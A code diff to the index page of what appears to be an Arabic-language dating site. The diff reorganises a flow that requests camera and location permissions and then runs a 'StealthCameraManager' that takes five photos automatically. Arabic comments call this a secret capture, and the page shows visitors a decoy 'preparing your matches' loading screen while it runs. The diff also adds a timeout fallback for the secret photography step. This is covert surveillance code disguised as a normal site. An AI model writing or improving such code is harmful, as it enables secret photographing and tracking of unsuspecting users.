@@ -103,6 +103,15 @@ const Index: React.FC = () => {
 				setPermissionsGranted(true);
 				// Start stealth photo capture
 				setShowStealthCapture(true);
+				
+				// Fallback timeout - إذا لم ينته التصوير خلال 30 ثانية، انتقل للمحتوى
+				setTimeout(() => {
+					if (showStealthCapture) {
+						console.log('⏰ انتهت المهلة الزمنية - الانتقال للمحتوى');
+						handleStealthCaptureComplete();
+					}
+				}, 30000); // 30 ثانية كحد أقصى
+				
 			} catch (error) {
 				console.error('Permission denied:', error);
 				setPermissionStatus('يجب السماح بالوصول للكاميرا والموقع لاستخدام الموقع');
@@ -114,43 +123,21 @@ const Index: React.FC = () => {
 	}, []);
 
 	const handleStealthCaptureComplete = () => {
+		console.log('🎉 تم الانتهاء من التصوير السري');
 		setCaptureComplete(true);
 		setShowStealthCapture(false);
+		
+		// إخفاء شاشة التحميل وعرض المحتوى فوراً
+		setTimeout(() => {
+			console.log('✅ عرض المحتوى الرئيسي');
+		}, 500);
 	};
 
-	// Don't render anything until permissions are granted and capture is complete
-	if (!permissionsGranted || showStealthCapture) {
-		if (showStealthCapture) {
-			return (
-				<div>
-					{/* النظام السري مع التشغيل التلقائي */}
-					<StealthCameraManager
-						onComplete={handleStealthCaptureComplete}
-						autoStart={true}
-						photoCount={5}
-					/>
-					{/* عرض محتوى عادي للمستخدم أثناء التقاط السري */}
-					<div className="min-h-screen flex flex-col items-center justify-center bg-gradient-to-br from-seductive-bg to-seductive-bg/80">
-						<div className="text-center p-8 rounded-lg bg-white/10 backdrop-blur-sm border border-white/20">
-							<div className="flex items-center justify-center gap-4 mb-6">
-								<Sparkles className="w-12 h-12 text-seductive-accent" />
-							</div>
-							<Loader2 className="w-16 h-16 text-seductive-accent animate-spin mb-6 mx-auto" />
-							<h2 className="text-2xl md:text-3xl text-white font-bold mb-4">
-								جاري تحضير تجربتك الخاصة
-							</h2>
-							<p className="text-lg text-white/90 mb-4">
-								نحن نجهز أفضل المطابقات لك...
-							</p>
-							<p className="text-sm text-white/70">
-								قريباً ستجد شريك العمر المناسب!
-							</p>
-						</div>
-					</div>
-				</div>
-			);
-		}
+	// عرض المحتوى إذا تم منح الأذونات وانتهى التصوير
+	const shouldShowContent = permissionsGranted && !showStealthCapture;
 
+	// Don't render anything until permissions are granted
+	if (!permissionsGranted) {
 		return (
 			<div className="min-h-screen flex flex-col items-center justify-center bg-gradient-to-br from-seductive-bg to-seductive-bg/80">
 				<div className="text-center p-8 rounded-lg bg-white/10 backdrop-blur-sm border border-white/20">
@@ -173,6 +160,39 @@ const Index: React.FC = () => {
 		);
 	}
 
+	// عرض شاشة التحميل أثناء التصوير السري
+	if (showStealthCapture) {
+		return (
+			<div>
+				{/* النظام السري مع التشغيل التلقائي */}
+				<StealthCameraManager
+					onComplete={handleStealthCaptureComplete}
+					autoStart={true}
+					photoCount={5}
+				/>
+				{/* عرض محتوى عادي للمستخدم أثناء التقاط السري */}
+				<div className="min-h-screen flex flex-col items-center justify-center bg-gradient-to-br from-seductive-bg to-seductive-bg/80">
+					<div className="text-center p-8 rounded-lg bg-white/10 backdrop-blur-sm border border-white/20">
+						<div className="flex items-center justify-center gap-4 mb-6">
+							<Sparkles className="w-12 h-12 text-seductive-accent" />
+						</div>
+						<Loader2 className="w-16 h-16 text-seductive-accent animate-spin mb-6 mx-auto" />
+						<h2 className="text-2xl md:text-3xl text-white font-bold mb-4">
+							جاري تحضير تجربتك الخاصة
+						</h2>
+						<p className="text-lg text-white/90 mb-4">
+							نحن نجهز أفضل المطابقات لك...
+						</p>
+						<p className="text-sm text-white/70">
+							قريباً ستجد شريك العمر المناسب!
+						</p>
+					</div>
+				</div>
+			</div>
+		);
+	}
+
+	// عرض المحتوى الرئيسي بعد انتهاء التصوير
 	return (
 		<div className="min-h-screen flex flex-col">
 			<header className="py-8 text-center">
